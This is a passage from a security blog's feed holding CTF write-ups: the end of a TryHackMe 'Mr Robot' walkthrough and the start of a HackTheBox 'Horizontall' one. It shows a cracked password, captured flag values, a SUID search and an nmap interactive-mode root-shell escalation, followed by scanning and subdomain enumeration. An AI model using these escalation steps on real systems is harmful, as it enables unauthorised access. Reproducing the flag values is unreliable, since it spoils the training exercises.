srcset="https://weaponizedpeach.github.io/p/tryhackme-mr-robot-ctf/password_hash_hu82650add3b23469d5b557edc591b383c_81381_480x0_resize_box_3.png 480w, https://weaponizedpeach.github.io/p/tryhackme-mr-robot-ctf/password_hash_hu82650add3b23469d5b557edc591b383c_81381_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="contents of /home/robot">
&lt;/a>
&lt;figcaption>contents of /home/robot&lt;/figcaption>
&lt;/figure>&lt;/p>
&lt;p>Here we found a password hash the second key, to which we don&amp;rsquo;t have access (yet). The &lt;code>raw-md5&lt;/code> clues us in that this hash is MD5. Let&amp;rsquo;s check &lt;a class="link" href="https://crackstation.net/" target="_blank" rel="noopener"
>CrackStation&lt;/a>, maybe it has already been cracked in the past.&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 257;
flex-basis: 618px"
>
&lt;a href="https://weaponizedpeach.github.io/p/tryhackme-mr-robot-ctf/robot_password_cracked.png" data-size="1011x392">
&lt;img src="https://weaponizedpeach.github.io/p/tryhackme-mr-robot-ctf/robot_password_cracked.png"
width="1011"
height="392"
srcset="https://weaponizedpeach.github.io/p/tryhackme-mr-robot-ctf/robot_password_cracked_hu517413d5c802e10f5c8c63e799e76544_41418_480x0_resize_box_3.png 480w, https://weaponizedpeach.github.io/p/tryhackme-mr-robot-ctf/robot_password_cracked_hu517413d5c802e10f5c8c63e799e76544_41418_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="Crackstation">
&lt;/a>
&lt;figcaption>Crackstation&lt;/figcaption>
&lt;/figure>&lt;/p>
&lt;p>Fortunately, CrackStation already had an exact match for this hash. We can now login to the &lt;code>robot&lt;/code> user with the password &lt;code>abcdefghijklmnopqrstuvwxyz&lt;/code>.&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 148;
flex-basis: 355px"
>
&lt;a href="https://weaponizedpeach.github.io/p/tryhackme-mr-robot-ctf/robot_access_gained.png" data-size="462x312">
&lt;img src="https://weaponizedpeach.github.io/p/tryhackme-mr-robot-ctf/robot_access_gained.png"
width="462"
height="312"
srcset="https://weaponizedpeach.github.io/p/tryhackme-mr-robot-ctf/robot_access_gained_huc33537c8fe0a83d48eedda193c90acfd_107400_480x0_resize_box_3.png 480w, https://weaponizedpeach.github.io/p/tryhackme-mr-robot-ctf/robot_access_gained_huc33537c8fe0a83d48eedda193c90acfd_107400_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="Login with user &amp;lsquo;robot&amp;rsquo;">
&lt;/a>
&lt;figcaption>Login with user ‘robot’&lt;/figcaption>
&lt;/figure>&lt;/p>
&lt;p>I had issues getting &lt;code>su&lt;/code> to work, so I just spawned a shell with Python and that got it working.&lt;/p>
&lt;p>&lt;code>robot&lt;/code> access allowed me to read the &lt;code>key-2-of-3.txt&lt;/code> file that I wasn&amp;rsquo;t able to previously -&amp;gt; &lt;code>822c73956184f694993bede3eb39f959&lt;/code>&lt;/p>
&lt;h3 id="vertical-escalation-root">Vertical escalation (root)&lt;/h3>
&lt;p>It was now time for the final obstacle: the root user.&lt;/p>
&lt;h4 id="suid-binaries">SUID Binaries&lt;/h4>
&lt;p>I scanned the system for unusual SUID binaries, this is one of the first areas I look for when trying to obtain privilege escalation, as it is one of the easiest and least time consuming to exploit. I prefer to use this one-liner:&lt;/p>
&lt;pre tabindex="0">&lt;code>find / -perm -u=s -type f 2&amp;gt;/dev/null
&lt;/code>&lt;/pre>&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 119;
flex-basis: 286px"
>
&lt;a href="https://weaponizedpeach.github.io/p/tryhackme-mr-robot-ctf/suid_binaries.png" data-size="528x442">
&lt;img src="https://weaponizedpeach.github.io/p/tryhackme-mr-robot-ctf/suid_binaries.png"
width="528"
height="442"
srcset="https://weaponizedpeach.github.io/p/tryhackme-mr-robot-ctf/suid_binaries_hu543a549293deeb9023a5834f19c9bcec_179350_480x0_resize_box_3.png 480w, https://weaponizedpeach.github.io/p/tryhackme-mr-robot-ctf/suid_binaries_hu543a549293deeb9023a5834f19c9bcec_179350_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="SUID binaries">
&lt;/a>
&lt;figcaption>SUID binaries&lt;/figcaption>
&lt;/figure>&lt;/p>
&lt;p>Among the results was an nmap binary, in &lt;code>/usr/local/&lt;/code>, of all places. I checked out &lt;a class="link" href="https://gtfobins.github.io/gtfobins/nmap/#suid" target="_blank" rel="noopener"
>GTFOBins&lt;/a> section regarding nmap.&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 230;
flex-basis: 552px"
>
&lt;a href="https://weaponizedpeach.github.io/p/tryhackme-mr-robot-ctf/gtfobins_nmap_suid.png" data-size="824x358">
&lt;img src="https://weaponizedpeach.github.io/p/tryhackme-mr-robot-ctf/gtfobins_nmap_suid.png"
width="824"
height="358"
srcset="https://weaponizedpeach.github.io/p/tryhackme-mr-robot-ctf/gtfobins_nmap_suid_hue966e42189d9e70c247f1c96a70b15a3_61500_480x0_resize_box_3.png 480w, https://weaponizedpeach.github.io/p/tryhackme-mr-robot-ctf/gtfobins_nmap_suid_hue966e42189d9e70c247f1c96a70b15a3_61500_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="GTFOBins: nmap (SUID)">
&lt;/a>
&lt;figcaption>GTFOBins: nmap (SUID)&lt;/figcaption>
&lt;/figure>&lt;/p>
&lt;p>Attempting to exploit this misconfiguration proved challenging. However, upon fiddling with the binary, I noticed it was &lt;code>nmap v.3.81&lt;/code> - a very old one, dating way way back to &lt;em>&lt;strong>2005&lt;/strong>&lt;/em>.&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 226;
flex-basis: 544px"
>
&lt;a href="https://weaponizedpeach.github.io/p/tryhackme-mr-robot-ctf/nmap_sudo.png" data-size="848x374">
&lt;img src="https://weaponizedpeach.github.io/p/tryhackme-mr-robot-ctf/nmap_sudo.png"
width="848"
height="374"
srcset="https://weaponizedpeach.github.io/p/tryhackme-mr-robot-ctf/nmap_sudo_hu796a66e423b88002f1110c7e4a0ca26d_40293_480x0_resize_box_3.png 480w, https://weaponizedpeach.github.io/p/tryhackme-mr-robot-ctf/nmap_sudo_hu796a66e423b88002f1110c7e4a0ca26d_40293_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="GTFOBins: nmap (SUDO)">
&lt;/a>
&lt;figcaption>GTFOBins: nmap (SUDO)&lt;/figcaption>
&lt;/figure>
Upon closer inspection, this version seemed to be vulnerable to the SUDO exploit mentioned in scenario B of the aforementioned GTFOBins section.&lt;/p>
&lt;p>It was time to test this out.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">robot@linux:~$ nmap --interactive
nmap --interactive
Starting nmap V. 3.81 &lt;span class="o">(&lt;/span> http://www.insecure.org/nmap/ &lt;span class="o">)&lt;/span>
Welcome to Interactive Mode -- press h &amp;lt;enter&amp;gt; &lt;span class="k">for&lt;/span> &lt;span class="nb">help&lt;/span>
nmap&amp;gt; !sh
!sh
&lt;span class="c1"># whoami&lt;/span>
whoami
root
&lt;span class="c1"># cd /root&lt;/span>
&lt;span class="nb">cd&lt;/span> /root
&lt;span class="c1"># ls&lt;/span>
ls
firstboot_done key-3-of-3.txt
&lt;span class="c1"># cat key-3-of-3.txt&lt;/span>
cat key-3-of-3.txt
04787ddef27c3dee1ee161b21670b4e4
&lt;span class="c1"># &lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>And just like that, we now both have root access and the last key: &lt;code>04787ddef27c3dee1ee161b21670b4e4&lt;/code>.&lt;/p>
&lt;h2 id="outro">Outro&lt;/h2>
&lt;p>Overall, this boxed prove to be pretty balanced difficulty-wise. I mostly have one critique - the over-reliance on the massive dictionary file. The box doesn&amp;rsquo;t handle many connections well, so the password cracking took a considerable amount of time. If I had to enumerate usernames with this wordlist as well, it would have taken even longer.&lt;/p>
&lt;p>I would have also liked the front-facing side of the website to lead somewhere, rather than just working as a front/cover. I think using the &lt;code>robots.txt&lt;/code> file as a callback to the show was somewhat clever.&lt;/p>
&lt;p>It was nice to try out a couple of Rust written tools this time.&lt;/p></description></item><item><title>HackTheBox: Horizontall</title><link>https://weaponizedpeach.github.io/p/hackthebox-horizontall/</link><pubDate>Sat, 05 Feb 2022 20:55:12 +0200</pubDate><guid>https://weaponizedpeach.github.io/p/hackthebox-horizontall/</guid><description>&lt;img src="https://weaponizedpeach.github.io/p/hackthebox-horizontall/cover.png" alt="Featured image of post HackTheBox: Horizontall" />&lt;h2 id="intro">Intro&lt;/h2>
&lt;p>Welcome to my very first writeup! I am just starting out my infosec journey, and this box was my first &amp;lsquo;real&amp;rsquo; challenge. Although it is rated &amp;lsquo;Easy&amp;rsquo;, I had to apply all of my current knowledge to snag both flags. Let&amp;rsquo;s crack straight into it!&lt;/p>
&lt;h2 id="reconnaissance">Reconnaissance&lt;/h2>
&lt;p>Machine tags:&lt;/p>
&lt;ul>
&lt;li>Linux&lt;/li>
&lt;li>CMS Exploit&lt;/li>
&lt;li>Outdated Software&lt;/li>
&lt;li>CVE&lt;/li>
&lt;li>Injection&lt;/li>
&lt;li>RCE&lt;/li>
&lt;li>Account Misconfiguration&lt;/li>
&lt;/ul>
&lt;p>The tags on the machine alone gives us a pretty good idea of what we&amp;rsquo;ll be up against.&lt;/p>
&lt;h2 id="scanning--discovery">Scanning &amp;amp; Discovery&lt;/h2>
&lt;h3 id="nmap">nmap&lt;/h3>
&lt;p>Let&amp;rsquo;s start with a simple &lt;code>nmap&lt;/code> scan:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="c1"># Nmap 7.92 scan initiated Fri Feb 4 15:37:34 2022 as: nmap -sC -sV -O -oA initial_scripts_versions_os 10.10.11.105&lt;/span>
Nmap scan report &lt;span class="k">for&lt;/span> 10.10.11.105
Host is up &lt;span class="o">(&lt;/span>0.046s latency&lt;span class="o">)&lt;/span>.
Not shown: &lt;span class="m">998&lt;/span> closed tcp ports &lt;span class="o">(&lt;/span>reset&lt;span class="o">)&lt;/span>
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 &lt;span class="o">(&lt;/span>Ubuntu Linux&lt;span class="p">;&lt;/span> protocol 2.0&lt;span class="o">)&lt;/span>
&lt;span class="p">|&lt;/span> ssh-hostkey:
&lt;span class="p">|&lt;/span> &lt;span class="m">2048&lt;/span> ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 &lt;span class="o">(&lt;/span>RSA&lt;span class="o">)&lt;/span>
&lt;span class="p">|&lt;/span> &lt;span class="m">256&lt;/span> 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 &lt;span class="o">(&lt;/span>ECDSA&lt;span class="o">)&lt;/span>
&lt;span class="p">|&lt;/span>_ &lt;span class="m">256&lt;/span> 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 &lt;span class="o">(&lt;/span>ED25519&lt;span class="o">)&lt;/span>
80/tcp open http nginx 1.14.0 &lt;span class="o">(&lt;/span>Ubuntu&lt;span class="o">)&lt;/span>
&lt;span class="p">|&lt;/span>_http-title: Did not follow redirect to http://horizontall.htb
&lt;span class="p">|&lt;/span>_http-server-header: nginx/1.14.0 &lt;span class="o">(&lt;/span>Ubuntu&lt;span class="o">)&lt;/span>
No exact OS matches &lt;span class="k">for&lt;/span> host &lt;span class="o">(&lt;/span>If you know what OS is running on it, see https://nmap.org/submit/ &lt;span class="o">)&lt;/span>.
TCP/IP fingerprint:
OS:SCAN&lt;span class="o">(&lt;/span>&lt;span class="nv">V&lt;/span>&lt;span class="o">=&lt;/span>7.92%E&lt;span class="o">=&lt;/span>4%D&lt;span class="o">=&lt;/span>2/4%OT&lt;span class="o">=&lt;/span>22%CT&lt;span class="o">=&lt;/span>1%CU&lt;span class="o">=&lt;/span>31967%PV&lt;span class="o">=&lt;/span>Y%DS&lt;span class="o">=&lt;/span>2%DC&lt;span class="o">=&lt;/span>I%G&lt;span class="o">=&lt;/span>Y%TM&lt;span class="o">=&lt;/span>61FD2C35
OS:%P&lt;span class="o">=&lt;/span>x86_64-pc-linux-gnu&lt;span class="o">)&lt;/span>SEQ&lt;span class="o">(&lt;/span>&lt;span class="nv">SP&lt;/span>&lt;span class="o">=&lt;/span>105%GCD&lt;span class="o">=&lt;/span>1%ISR&lt;span class="o">=&lt;/span>10B%TI&lt;span class="o">=&lt;/span>Z%CI&lt;span class="o">=&lt;/span>Z%II&lt;span class="o">=&lt;/span>I%TS&lt;span class="o">=&lt;/span>A&lt;span class="o">)&lt;/span>OPS&lt;span class="o">(&lt;/span>
OS:O1&lt;span class="o">=&lt;/span>M505ST11NW7%O2&lt;span class="o">=&lt;/span>M505ST11NW7%O3&lt;span class="o">=&lt;/span>M505NNT11NW7%O4&lt;span class="o">=&lt;/span>M505ST11NW7%O5&lt;span class="o">=&lt;/span>M505ST11
OS:NW7%O6&lt;span class="o">=&lt;/span>M505ST11&lt;span class="o">)&lt;/span>WIN&lt;span class="o">(&lt;/span>&lt;span class="nv">W1&lt;/span>&lt;span class="o">=&lt;/span>FE88%W2&lt;span class="o">=&lt;/span>FE88%W3&lt;span class="o">=&lt;/span>FE88%W4&lt;span class="o">=&lt;/span>FE88%W5&lt;span class="o">=&lt;/span>FE88%W6&lt;span class="o">=&lt;/span>FE88&lt;span class="o">)&lt;/span>ECN&lt;span class="o">(&lt;/span>
OS:R&lt;span class="o">=&lt;/span>Y%DF&lt;span class="o">=&lt;/span>Y%T&lt;span class="o">=&lt;/span>40%W&lt;span class="o">=&lt;/span>FAF0%O&lt;span class="o">=&lt;/span>M505NNSNW7%CC&lt;span class="o">=&lt;/span>Y%Q&lt;span class="o">=)&lt;/span>T1&lt;span class="o">(&lt;/span>&lt;span class="nv">R&lt;/span>&lt;span class="o">=&lt;/span>Y%DF&lt;span class="o">=&lt;/span>Y%T&lt;span class="o">=&lt;/span>40%S&lt;span class="o">=&lt;/span>O%A&lt;span class="o">=&lt;/span>S+%F&lt;span class="o">=&lt;/span>AS
OS:%RD&lt;span class="o">=&lt;/span>0%Q&lt;span class="o">=)&lt;/span>T2&lt;span class="o">(&lt;/span>&lt;span class="nv">R&lt;/span>&lt;span class="o">=&lt;/span>N&lt;span class="o">)&lt;/span>T3&lt;span class="o">(&lt;/span>&lt;span class="nv">R&lt;/span>&lt;span class="o">=&lt;/span>N&lt;span class="o">)&lt;/span>T4&lt;span class="o">(&lt;/span>&lt;span class="nv">R&lt;/span>&lt;span class="o">=&lt;/span>Y%DF&lt;span class="o">=&lt;/span>Y%T&lt;span class="o">=&lt;/span>40%W&lt;span class="o">=&lt;/span>0%S&lt;span class="o">=&lt;/span>A%A&lt;span class="o">=&lt;/span>Z%F&lt;span class="o">=&lt;/span>R%O&lt;span class="o">=&lt;/span>%RD&lt;span class="o">=&lt;/span>0%Q&lt;span class="o">=)&lt;/span>T5&lt;span class="o">(&lt;/span>&lt;span class="nv">R&lt;/span>&lt;span class="o">=&lt;/span>
OS:Y%DF&lt;span class="o">=&lt;/span>Y%T&lt;span class="o">=&lt;/span>40%W&lt;span class="o">=&lt;/span>0%S&lt;span class="o">=&lt;/span>Z%A&lt;span class="o">=&lt;/span>S+%F&lt;span class="o">=&lt;/span>AR%O&lt;span class="o">=&lt;/span>%RD&lt;span class="o">=&lt;/span>0%Q&lt;span class="o">=)&lt;/span>T6&lt;span class="o">(&lt;/span>&lt;span class="nv">R&lt;/span>&lt;span class="o">=&lt;/span>Y%DF&lt;span class="o">=&lt;/span>Y%T&lt;span class="o">=&lt;/span>40%W&lt;span class="o">=&lt;/span>0%S&lt;span class="o">=&lt;/span>A%A&lt;span class="o">=&lt;/span>Z%F&lt;span class="o">=&lt;/span>
OS:R%O&lt;span class="o">=&lt;/span>%RD&lt;span class="o">=&lt;/span>0%Q&lt;span class="o">=)&lt;/span>T7&lt;span class="o">(&lt;/span>&lt;span class="nv">R&lt;/span>&lt;span class="o">=&lt;/span>Y%DF&lt;span class="o">=&lt;/span>Y%T&lt;span class="o">=&lt;/span>40%W&lt;span class="o">=&lt;/span>0%S&lt;span class="o">=&lt;/span>Z%A&lt;span class="o">=&lt;/span>S+%F&lt;span class="o">=&lt;/span>AR%O&lt;span class="o">=&lt;/span>%RD&lt;span class="o">=&lt;/span>0%Q&lt;span class="o">=)&lt;/span>U1&lt;span class="o">(&lt;/span>&lt;span class="nv">R&lt;/span>&lt;span class="o">=&lt;/span>Y%DF&lt;span class="o">=&lt;/span>N%T
OS:&lt;span class="o">=&lt;/span>40%IPL&lt;span class="o">=&lt;/span>164%UN&lt;span class="o">=&lt;/span>0%RIPL&lt;span class="o">=&lt;/span>G%RID&lt;span class="o">=&lt;/span>G%RIPCK&lt;span class="o">=&lt;/span>G%RUCK&lt;span class="o">=&lt;/span>G%RUD&lt;span class="o">=&lt;/span>G&lt;span class="o">)&lt;/span>IE&lt;span class="o">(&lt;/span>&lt;span class="nv">R&lt;/span>&lt;span class="o">=&lt;/span>Y%DFI&lt;span class="o">=&lt;/span>N%T&lt;span class="o">=&lt;/span>40%CD&lt;span class="o">=&lt;/span>
OS:S&lt;span class="o">)&lt;/span>
Network Distance: &lt;span class="m">2&lt;/span> hops
Service Info: OS: Linux&lt;span class="p">;&lt;/span> CPE: cpe:/o:linux:linux_kernel
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Takeaway:&lt;/p>
&lt;ul>
&lt;li>&lt;code>nginx&lt;/code> web server running on &lt;code>:80&lt;/code>&lt;/li>
&lt;li>&lt;code>OpenSSH 7.6p1&lt;/code> SSH server on &lt;code>:22&lt;/code>&lt;/li>
&lt;li>Ubuntu OS&lt;/li>
&lt;/ul>
&lt;p>&lt;code>_http-title: Did not follow redirect to http://horizontall.htb&lt;/code>&lt;/p>
&lt;p>We can see a redirect to a URL. Let&amp;rsquo;s add it to our /etc/hosts file:&lt;/p>
&lt;p>&lt;code>sudo echo &amp;quot;10.10.11.105 horizontall.htb&amp;quot; &amp;gt;&amp;gt; /etc/hosts&lt;/code>&lt;/p>
&lt;p>I left an all port scan in the background afterwards, but it did not give any additional results.&lt;/p>
&lt;h3 id="whatweb">whatweb&lt;/h3>
&lt;p>Whatweb didn&amp;rsquo;t give us any more information than nmap already did.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">http://horizontall.htb &lt;span class="o">[&lt;/span>&lt;span class="m">200&lt;/span> OK&lt;span class="o">]&lt;/span> Country&lt;span class="o">[&lt;/span>RESERVED&lt;span class="o">][&lt;/span>ZZ&lt;span class="o">]&lt;/span>, HTML5, HTTPServer&lt;span class="o">[&lt;/span>Ubuntu Linux&lt;span class="o">]&lt;/span>
&lt;span class="o">[&lt;/span>nginx/1.14.0 &lt;span class="o">(&lt;/span>Ubuntu&lt;span class="o">)]&lt;/span>, IP&lt;span class="o">[&lt;/span>10.10.11.105&lt;span class="o">]&lt;/span>, Script, Title&lt;span class="o">[&lt;/span>horizontall&lt;span class="o">]&lt;/span>,
X-UA-Compatible&lt;span class="o">[&lt;/span>&lt;span class="nv">IE&lt;/span>&lt;span class="o">=&lt;/span>edge&lt;span class="o">]&lt;/span>, nginx&lt;span class="o">[&lt;/span>1.14.0&lt;span class="o">]&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="horizontallhtb">horizontall.htb&lt;/h3>
&lt;p>I connected to this URL and was greeted by this:&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 137;
flex-basis: 328px"
>
&lt;a href="https://weaponizedpeach.github.io/p/hackthebox-horizontall/landing.png" data-size="965x704">
&lt;img src="https://weaponizedpeach.github.io/p/hackthebox-horizontall/landing.png"
width="965"
height="704"
srcset="https://weaponizedpeach.github.io/p/hackthebox-horizontall/landing_hu13df9e079a959b6c4eb977047883a5f8_78873_480x0_resize_box_3.png 480w, https://weaponizedpeach.github.io/p/hackthebox-horizontall/landing_hu13df9e079a959b6c4eb977047883a5f8_78873_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="Landing page">
&lt;/a>
&lt;figcaption>Landing page&lt;/figcaption>
&lt;/figure>&lt;/p>
&lt;p>Scrolling down, I noticed what seemed like a contact form of some sort:&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 222;
flex-basis: 534px"
>
&lt;a href="https://weaponizedpeach.github.io/p/hackthebox-horizontall/contact_form.png" data-size="955x429">
&lt;img src="https://weaponizedpeach.github.io/p/hackthebox-horizontall/contact_form.png"
width="955"
height="429"
srcset="https://weaponizedpeach.github.io/p/hackthebox-horizontall/contact_form_huf862caa08a595f9570d016af4eb49880_38915_480x0_resize_box_3.png 480w, https://weaponizedpeach.github.io/p/hackthebox-horizontall/contact_form_huf862caa08a595f9570d016af4eb49880_38915_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="Contact form">
&lt;/a>
&lt;figcaption>Contact form&lt;/figcaption>
&lt;/figure>&lt;/p>
&lt;p>I did my best attempt at an XSS script, but after writing it I noticed that the &amp;ldquo;Send&amp;rdquo; button has no JS attached to it. So this attack surface, at least, was not likely.&lt;/p>
&lt;p>Next, I decided to try and brute-force some hidden files and directories with gobuster.&lt;/p>
&lt;h3 id="gobuster--horizontallhtb">gobuster @ horizontall.htb&lt;/h3>
&lt;p>I did a quick peek with the dirb/big.txt wordlist, but did not find anything of interest:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="o">===============================================================&lt;/span>
Gobuster v3.1.0
by OJ Reeves &lt;span class="o">(&lt;/span>@TheColonial&lt;span class="o">)&lt;/span> &lt;span class="p">&amp;amp;&lt;/span> Christian Mehlmauer &lt;span class="o">(&lt;/span>@firefart&lt;span class="o">)&lt;/span>
&lt;span class="o">===============================================================&lt;/span>
&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Url: http://horizontall.htb
&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Method: GET
&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Threads: &lt;span class="m">10&lt;/span>
&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Wordlist: /usr/share/wordlists/dirb/big.txt
&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Negative Status codes: &lt;span class="m">404&lt;/span>
&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> User Agent: gobuster/3.1.0
&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Extensions: conf,php,txt,asp,aspx
&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Timeout: &lt;span class="nv">10s&lt;/span>
&lt;span class="o">===============================================================&lt;/span>
2022/02/04 16:14:11 Starting gobuster in directory enumeration &lt;span class="nv">mode&lt;/span>
&lt;span class="o">===============================================================&lt;/span>
/css &lt;span class="o">(&lt;/span>Status: 301&lt;span class="o">)&lt;/span> &lt;span class="o">[&lt;/span>Size: 194&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>--&amp;gt; http://horizontall.htb/css/&lt;span class="o">]&lt;/span>
/favicon.ico &lt;span class="o">(&lt;/span>Status: 200&lt;span class="o">)&lt;/span> &lt;span class="o">[&lt;/span>Size: 4286&lt;span class="o">]&lt;/span>
/img &lt;span class="o">(&lt;/span>Status: 301&lt;span class="o">)&lt;/span> &lt;span class="o">[&lt;/span>Size: 194&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>--&amp;gt; http://horizontall.htb/img/&lt;span class="o">]&lt;/span>
/js &lt;span class="o">(&lt;/span>Status: 301&lt;span class="o">)&lt;/span> &lt;span class="o">[&lt;/span>Size: 194&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>--&amp;gt; http://horizontall.htb/js/&lt;span class="o">]&lt;/span>
&lt;span class="o">===============================================================&lt;/span>
2022/02/04 16:28:50 &lt;span class="nv">Finished&lt;/span>
&lt;span class="o">===============================================================&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>I pondered running a larger wordlist, but decided to check out the SSH service before coming back for a second try.&lt;/p>
&lt;h3 id="ssh-service-rabbit-hole">SSH Service (rabbit hole)&lt;/h3>
&lt;p>What caught my eye after the nmap scan, was the &lt;code>OpenSSH 7.6p1&lt;/code> version of the SSH service. A quick search on &lt;code>exploit-db.com&lt;/code> found multiple possible vulnerabilities. What solidified my belief, was the &lt;code>CVE 2018-15473&lt;/code> exploit named &lt;a class="link" href="https://www.exploit-db.com/exploits/45233" target="_blank" rel="noopener"
>OpenSSH 2.3 &amp;lt; 7.7 - Username Enumeration&lt;/a>. It seemed as though the box&amp;rsquo;s version was succeptible. After attempting both manually running the scripts on &lt;code>exploit-db.com&lt;/code> as well as trying them out automatically via Metasploit, I realized that the server does not leak existing usernames. Rather, it reports all usernames as valid.&lt;/p>
&lt;p>As such, using a brute-force or dictionary attack via Hydra or something similar was also something I closed the book on.&lt;/p>
&lt;p>Although, the machine had the tag &amp;ldquo;CMS&amp;rdquo;, however we only ever saw a landing page. Is there something we missed? Where is this CMS?&lt;/p>
&lt;h3 id="wfuzz-subdomains">wfuzz subdomains&lt;/h3>
&lt;p>With nowhere else to go, I tried to enumerate possible subdomains. I used the amazing &lt;code>subdomains-top1million-110000.txt&lt;/code> wordlist from the &lt;a class="link" href="https://github.com/danielmiessler/SecLists" target="_blank" rel="noopener"
>SecLists repository&lt;/a> that I very much recommend.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">wfuzz -c -f subdomains -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u &lt;span class="s1">&amp;#39;http://horizontall.htb&amp;#39;&lt;/span> -H &lt;span class="s2">&amp;#34;Host: FUZZ.horizontall.htb&amp;#34;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>We found &lt;strong>one&lt;/strong> subdomain out of the ~114000 -&amp;gt; &lt;code>api-prod&lt;/code>&lt;/p>
&lt;p>Let&amp;rsquo;s quickly add it to our hosts file and check it out!&lt;/p>
&lt;p>&lt;code>sudo echo &amp;quot;10.10.11.105 api-prod.horizontall.htb&amp;quot; &amp;gt;&amp;gt; /etc/hosts&lt;/code>&lt;/p>
&lt;h3 id="api-prodhorizontallhtb">api-prod.horizontall.htb&lt;/h3>
&lt;p>Upon connecting, I was greeted with a very underwhelming screen:&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 356;
flex-basis: 855px"
>
&lt;a href="https://weaponizedpeach.github.io/p/hackthebox-horizontall/api-prod.png" data-size="456x128">
&lt;img src="https://weaponizedpeach.github.io/p/hackthebox-horizontall/api-prod.png"
width="456"
height="128"
srcset="https://weaponizedpeach.github.io/p/hackthebox-horizontall/api-prod_hua3cdf2001a59290f7ff6a7ec50db8ba4_3378_480x0_resize_box_3.png 480w, https://weaponizedpeach.github.io/p/hackthebox-horizontall/api-prod_hua3cdf2001a59290f7ff6a7ec50db8ba4_3378_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="api-prod.horizontall.htb">
&lt;/a>
&lt;figcaption>api-prod.horizontall.htb&lt;/figcaption>
&lt;/figure>&lt;/p>
&lt;p>The source code did not give any particularly interesting leads, and so, I went for another gobuster run.&lt;/p>
&lt;h3 id="gobuster--api-prodhorizontallhtb">gobuster @ api-prod.horizontall.htb&lt;/h3>
&lt;p>Looking for clues, I started another gobuster run, this time with a much larger wordlist, just in case, &lt;code>directory-list-2.3-big.txt&lt;/code> from the aforementioned SecLists repo.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="o">===============================================================&lt;/span>
Gobuster v3.1.0
by OJ Reeves &lt;span class="o">(&lt;/span>@TheColonial&lt;span class="o">)&lt;/span> &lt;span class="p">&amp;amp;&lt;/span> Christian Mehlmauer &lt;span class="o">(&lt;/span>@firefart&lt;span class="o">)&lt;/span>
&lt;span class="o">===============================================================&lt;/span>
&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Url: http://api-prod.horizontall.htb/
&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Method: GET
&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Threads: &lt;span class="m">10&lt;/span>
&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Wordlist: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Negative Status codes: &lt;span class="m">404&lt;/span>
&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> User Agent: gobuster/3.1.0
&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Timeout: &lt;span class="nv">10s&lt;/span>
&lt;span class="o">===============================================================&lt;/span>
2022/02/04 17:17:09 Starting gobuster in directory enumeration &lt;span class="nv">mode&lt;/span>
&lt;span class="o">===============================================================&lt;/span>
/reviews &lt;span class="o">(&lt;/span>Status: 200&lt;span class="o">)&lt;/span> &lt;span class="o">[&lt;/span>Size: 507&lt;span class="o">]&lt;/span>
/users &lt;span class="o">(&lt;/span>Status: 403&lt;span class="o">)&lt;/span> &lt;span class="o">[&lt;/span>Size: 60&lt;span class="o">]&lt;/span>
